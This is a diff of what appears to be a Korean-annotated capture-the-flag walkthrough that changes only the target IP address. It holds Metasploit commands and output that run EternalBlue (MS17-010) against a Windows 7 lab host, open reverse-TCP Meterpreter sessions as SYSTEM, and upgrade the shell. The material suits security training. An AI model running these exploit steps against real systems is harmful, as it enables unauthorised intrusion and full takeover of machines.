@@ -117,85 +117,85 @@ Nmap done: 1 IP address (1 host up) scanned in 134.66 seconds
 Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce
 After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'
 
-# msf exploit(windows/smb/ms17\*010_eternalblue) > set RHOSTS 10.201.46.32
+# msf exploit(windows/smb/ms17\*010_eternalblue) > set RHOSTS 10.201.21.43
 
-RHOSTS => 10.201.46.32
+RHOSTS => 10.201.21.43
 
 # msf exploit(windows/smb/ms17_010_eternalblue) > run
 
 msf exploit(windows/smb/ms17*010_eternalblue) > run
 [*] Started reverse TCP handler on 192.168.65.3:4444
-[*] 10.201.46.32:445 - Using auxiliary/scanner/smb/smb*ms17_010 as check
-[+] 10.201.46.32:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+[*] 10.201.21.43:445 - Using auxiliary/scanner/smb/smb*ms17_010 as check
+[+] 10.201.21.43:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
 /usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.21/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '\*' in regular expression
-[*] 10.201.46.32:445 - Scanned 1 of 1 hosts (100% complete)
-[+] 10.201.46.32:445 - The target is vulnerable.
-[*] 10.201.46.32:445 - Connecting to target for exploitation.
-[+] 10.201.46.32:445 - Connection established for exploitation.
-[+] 10.201.46.32:445 - Target OS selected valid for OS indicated by SMB reply
-[*] 10.201.46.32:445 - CORE raw buffer dump (42 bytes)
-[*] 10.201.46.32:445 - 0x00000000 57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73 Windows 7 Profes
-[*] 10.201.46.32:445 - 0x00000010 73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76 sional 7601 Serv
-[*] 10.201.46.32:445 - 0x00000020 69 63 65 20 50 61 63 6b 20 31 ice Pack 1  
-[+] 10.201.46.32:445 - Target arch selected valid for arch indicated by DCE/RPC reply
-[*] 10.201.46.32:445 - Trying exploit with 12 Groom Allocations.
-[*] 10.201.46.32:445 - Sending all but last fragment of exploit packet
-[*] 10.201.46.32:445 - Starting non-paged pool grooming
-[+] 10.201.46.32:445 - Sending SMBv2 buffers
-[+] 10.201.46.32:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
-[*] 10.201.46.32:445 - Sending final SMBv2 buffers.
-[*] 10.201.46.32:445 - Sending last fragment of exploit packet!
-[*] 10.201.46.32:445 - Receiving response from exploit packet
-[+] 10.201.46.32:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
-[*] 10.201.46.32:445 - Sending egg to corrupted connection.
-[*] 10.201.46.32:445 - Triggering free of corrupted buffer.
-[-] 10.201.46.32:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
-[-] 10.201.46.32:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
-[-] 10.201.46.32:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
-[*] 10.201.46.32:445 - Connecting to target for exploitation.
-[+] 10.201.46.32:445 - Connection established for exploitation.
-[+] 10.201.46.32:445 - Target OS selected valid for OS indicated by SMB reply
-[*] 10.201.46.32:445 - CORE raw buffer dump (42 bytes)
-[*] 10.201.46.32:445 - 0x00000000 57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73 Windows 7 Profes
-[*] 10.201.46.32:445 - 0x00000010 73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76 sional 7601 Serv
-[*] 10.201.46.32:445 - 0x00000020 69 63 65 20 50 61 63 6b 20 31 ice Pack 1  
-[+] 10.201.46.32:445 - Target arch selected valid for arch indicated by DCE/RPC reply
-[*] 10.201.46.32:445 - Trying exploit with 17 Groom Allocations.
-[*] 10.201.46.32:445 - Sending all but last fragment of exploit packet
-[*] 10.201.46.32:445 - Starting non-paged pool grooming
-[+] 10.201.46.32:445 - Sending SMBv2 buffers
-[+] 10.201.46.32:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
-[*] 10.201.46.32:445 - Sending final SMBv2 buffers.
-[*] 10.201.46.32:445 - Sending last fragment of exploit packet!
-[*] 10.201.46.32:445 - Receiving response from exploit packet
-[+] 10.201.46.32:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
-[*] 10.201.46.32:445 - Sending egg to corrupted connection.
-[*] 10.201.46.32:445 - Triggering free of corrupted buffer.
-[-] 10.201.46.32:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
-[-] 10.201.46.32:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
-[-] 10.201.46.32:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
-[*] 10.201.46.32:445 - Connecting to target for exploitation.
-[+] 10.201.46.32:445 - Connection established for exploitation.
-[+] 10.201.46.32:445 - Target OS selected valid for OS indicated by SMB reply
-[*] 10.201.46.32:445 - CORE raw buffer dump (42 bytes)
-[*] 10.201.46.32:445 - 0x00000000 57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73 Windows 7 Profes
-[*] 10.201.46.32:445 - 0x00000010 73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76 sional 7601 Serv
-[*] 10.201.46.32:445 - 0x00000020 69 63 65 20 50 61 63 6b 20 31 ice Pack 1  
-[+] 10.201.46.32:445 - Target arch selected valid for arch indicated by DCE/RPC reply
-[*] 10.201.46.32:445 - Trying exploit with 22 Groom Allocations.
-[*] 10.201.46.32:445 - Sending all but last fragment of exploit packet
-[*] 10.201.46.32:445 - Starting non-paged pool grooming
-[+] 10.201.46.32:445 - Sending SMBv2 buffers
-[+] 10.201.46.32:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
-[*] 10.201.46.32:445 - Sending final SMBv2 buffers.
-[*] 10.201.46.32:445 - Sending last fragment of exploit packet!
-[*] 10.201.46.32:445 - Receiving response from exploit packet
-[+] 10.201.46.32:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
-[*] 10.201.46.32:445 - Sending egg to corrupted connection.
-[*] 10.201.46.32:445 - Triggering free of corrupted buffer.
-[-] 10.201.46.32:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
-[-] 10.201.46.32:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
-[-] 10.201.46.32:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[*] 10.201.21.43:445 - Scanned 1 of 1 hosts (100% complete)
+[+] 10.201.21.43:445 - The target is vulnerable.
+[*] 10.201.21.43:445 - Connecting to target for exploitation.
+[+] 10.201.21.43:445 - Connection established for exploitation.
+[+] 10.201.21.43:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 10.201.21.43:445 - CORE raw buffer dump (42 bytes)
+[*] 10.201.21.43:445 - 0x00000000 57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73 Windows 7 Profes
+[*] 10.201.21.43:445 - 0x00000010 73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76 sional 7601 Serv
+[*] 10.201.21.43:445 - 0x00000020 69 63 65 20 50 61 63 6b 20 31 ice Pack 1  
+[+] 10.201.21.43:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 10.201.21.43:445 - Trying exploit with 12 Groom Allocations.
+[*] 10.201.21.43:445 - Sending all but last fragment of exploit packet
+[*] 10.201.21.43:445 - Starting non-paged pool grooming
+[+] 10.201.21.43:445 - Sending SMBv2 buffers
+[+] 10.201.21.43:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 10.201.21.43:445 - Sending final SMBv2 buffers.
+[*] 10.201.21.43:445 - Sending last fragment of exploit packet!
+[*] 10.201.21.43:445 - Receiving response from exploit packet
+[+] 10.201.21.43:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 10.201.21.43:445 - Sending egg to corrupted connection.
+[*] 10.201.21.43:445 - Triggering free of corrupted buffer.
+[-] 10.201.21.43:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[-] 10.201.21.43:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[-] 10.201.21.43:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[*] 10.201.21.43:445 - Connecting to target for exploitation.
+[+] 10.201.21.43:445 - Connection established for exploitation.
+[+] 10.201.21.43:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 10.201.21.43:445 - CORE raw buffer dump (42 bytes)
+[*] 10.201.21.43:445 - 0x00000000 57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73 Windows 7 Profes
+[*] 10.201.21.43:445 - 0x00000010 73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76 sional 7601 Serv
+[*] 10.201.21.43:445 - 0x00000020 69 63 65 20 50 61 63 6b 20 31 ice Pack 1  
+[+] 10.201.21.43:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 10.201.21.43:445 - Trying exploit with 17 Groom Allocations.
+[*] 10.201.21.43:445 - Sending all but last fragment of exploit packet
+[*] 10.201.21.43:445 - Starting non-paged pool grooming
+[+] 10.201.21.43:445 - Sending SMBv2 buffers
+[+] 10.201.21.43:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 10.201.21.43:445 - Sending final SMBv2 buffers.
+[*] 10.201.21.43:445 - Sending last fragment of exploit packet!
+[*] 10.201.21.43:445 - Receiving response from exploit packet
+[+] 10.201.21.43:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 10.201.21.43:445 - Sending egg to corrupted connection.
+[*] 10.201.21.43:445 - Triggering free of corrupted buffer.
+[-] 10.201.21.43:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[-] 10.201.21.43:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[-] 10.201.21.43:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[*] 10.201.21.43:445 - Connecting to target for exploitation.
+[+] 10.201.21.43:445 - Connection established for exploitation.
+[+] 10.201.21.43:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 10.201.21.43:445 - CORE raw buffer dump (42 bytes)
+[*] 10.201.21.43:445 - 0x00000000 57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73 Windows 7 Profes
+[*] 10.201.21.43:445 - 0x00000010 73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76 sional 7601 Serv
+[*] 10.201.21.43:445 - 0x00000020 69 63 65 20 50 61 63 6b 20 31 ice Pack 1  
+[+] 10.201.21.43:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 10.201.21.43:445 - Trying exploit with 22 Groom Allocations.
+[*] 10.201.21.43:445 - Sending all but last fragment of exploit packet
+[*] 10.201.21.43:445 - Starting non-paged pool grooming
+[+] 10.201.21.43:445 - Sending SMBv2 buffers
+[+] 10.201.21.43:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 10.201.21.43:445 - Sending final SMBv2 buffers.
+[*] 10.201.21.43:445 - Sending last fragment of exploit packet!
+[*] 10.201.21.43:445 - Receiving response from exploit packet
+[+] 10.201.21.43:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 10.201.21.43:445 - Sending egg to corrupted connection.
+[*] 10.201.21.43:445 - Triggering free of corrupted buffer.
+[-] 10.201.21.43:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[-] 10.201.21.43:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[-] 10.201.21.43:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 [*] Exploit completed, but no session was created.
 msf exploit(windows/smb/ms17_010_eternalblue) >
 
@@ -206,34 +206,34 @@ msf exploit(windows/smb/ms17_010_eternalblue) >
 lhost => tun0
 msf exploit(windows/smb/ms17_010_eternalblue) > run
 [*] Started reverse TCP handler on 10.8.136.212:4444
-[*] 10.201.46.32:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
-[+] 10.201.46.32:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
-[*] 10.201.46.32:445 - Scanned 1 of 1 hosts (100% complete)
-[+] 10.201.46.32:445 - The target is vulnerable.
-[*] 10.201.46.32:445 - Connecting to target for exploitation.
-[+] 10.201.46.32:445 - Connection established for exploitation.
-[+] 10.201.46.32:445 - Target OS selected valid for OS indicated by SMB reply
-[*] 10.201.46.32:445 - CORE raw buffer dump (42 bytes)
-[*] 10.201.46.32:445 - 0x00000000 57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73 Windows 7 Profes
-[*] 10.201.46.32:445 - 0x00000010 73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76 sional 7601 Serv
-[*] 10.201.46.32:445 - 0x00000020 69 63 65 20 50 61 63 6b 20 31 ice Pack 1  
-[+] 10.201.46.32:445 - Target arch selected valid for arch indicated by DCE/RPC reply
-[*] 10.201.46.32:445 - Trying exploit with 12 Groom Allocations.
-[*] 10.201.46.32:445 - Sending all but last fragment of exploit packet
-[*] 10.201.46.32:445 - Starting non-paged pool grooming
-[+] 10.201.46.32:445 - Sending SMBv2 buffers
-[+] 10.201.46.32:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
-[*] 10.201.46.32:445 - Sending final SMBv2 buffers.
-[*] 10.201.46.32:445 - Sending last fragment of exploit packet!
-[*] 10.201.46.32:445 - Receiving response from exploit packet
-[+] 10.201.46.32:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
-[*] 10.201.46.32:445 - Sending egg to corrupted connection.
-[*] 10.201.46.32:445 - Triggering free of corrupted buffer.
-[*] Sending stage (203846 bytes) to 10.201.46.32
-[+] 10.201.46.32:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
-[+] 10.201.46.32:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
-[+] 10.201.46.32:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
-[*] Meterpreter session 1 opened (10.8.136.212:4444 -> 10.201.46.32:49193) at 2025-09-16 14:41:45 +0000
+[*] 10.201.21.43:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 10.201.21.43:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+[*] 10.201.21.43:445 - Scanned 1 of 1 hosts (100% complete)
+[+] 10.201.21.43:445 - The target is vulnerable.
+[*] 10.201.21.43:445 - Connecting to target for exploitation.
+[+] 10.201.21.43:445 - Connection established for exploitation.
+[+] 10.201.21.43:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 10.201.21.43:445 - CORE raw buffer dump (42 bytes)
+[*] 10.201.21.43:445 - 0x00000000 57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73 Windows 7 Profes
+[*] 10.201.21.43:445 - 0x00000010 73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76 sional 7601 Serv
+[*] 10.201.21.43:445 - 0x00000020 69 63 65 20 50 61 63 6b 20 31 ice Pack 1  
+[+] 10.201.21.43:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 10.201.21.43:445 - Trying exploit with 12 Groom Allocations.
+[*] 10.201.21.43:445 - Sending all but last fragment of exploit packet
+[*] 10.201.21.43:445 - Starting non-paged pool grooming
+[+] 10.201.21.43:445 - Sending SMBv2 buffers
+[+] 10.201.21.43:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 10.201.21.43:445 - Sending final SMBv2 buffers.
+[*] 10.201.21.43:445 - Sending last fragment of exploit packet!
+[*] 10.201.21.43:445 - Receiving response from exploit packet
+[+] 10.201.21.43:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 10.201.21.43:445 - Sending egg to corrupted connection.
+[*] 10.201.21.43:445 - Triggering free of corrupted buffer.
+[*] Sending stage (203846 bytes) to 10.201.21.43
+[+] 10.201.21.43:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.201.21.43:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.201.21.43:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[*] Meterpreter session 1 opened (10.8.136.212:4444 -> 10.201.21.43:49193) at 2025-09-16 14:41:45 +0000
 
 # CTF 환경 -> local host setting required -> so then WIN!
 
@@ -252,7 +252,7 @@ Id Name Type Information Connection
 
 ---
 
-1 meterpreter x64/windows NT AUTHORITY\SYSTEM @ JON-PC 10.8.136.212:4444 -> 10.201.46.32:49193 (10.201.46.32)
+1 meterpreter x64/windows NT AUTHORITY\SYSTEM @ JON-PC 10.8.136.212:4444 -> 10.201.21.43:49193 (10.201.21.43)
 
 # 이미 쉘을 얻었으므로 post 그리고 meterpreter 로 업그레이드 하는 모듈 검색하기
 
@@ -313,7 +313,7 @@ Id Name Type Information Connection
 
 ---
 
-1 meterpreter x64/windows NT AUTHORITY\SYSTEM @ JON-PC 10.8.136.212:4444 -> 10.201.46.32:49193 (10.201.46.32)
+1 meterpreter x64/windows NT AUTHORITY\SYSTEM @ JON-PC 10.8.136.212:4444 -> 10.201.21.43:49193 (10.201.21.43)
 
 # 세션 지정 -> msf post(multi/manage/shell_to_meterpreter) > set SESSION 1
 
@@ -327,8 +327,8 @@ msf post(multi/manage/shell_to_meterpreter) > run
 [*] Started reverse TCP handler on 10.8.136.212:4433
 [*] Post module execution completed
 msf post(multi/manage/shell_to_meterpreter) >
-[*] Sending stage (203846 bytes) to 10.201.46.32
-[*] Meterpreter session 2 opened (10.8.136.212:4433 -> 10.201.46.32:49197) at 2025-09-16 15:08:28 +0000
+[*] Sending stage (203846 bytes) to 10.201.21.43
+[*] Meterpreter session 2 opened (10.8.136.212:4433 -> 10.201.21.43:49197) at 2025-09-16 15:08:28 +0000
 [*] Stopping exploit/multi/handler
 
 # sessions -l
@@ -338,3 +338,5 @@ msf post(multi/manage/shell_to_meterpreter) >
 [*] Starting interaction with 2...
 
 meterpreter >
+
+# 10.201.21.43
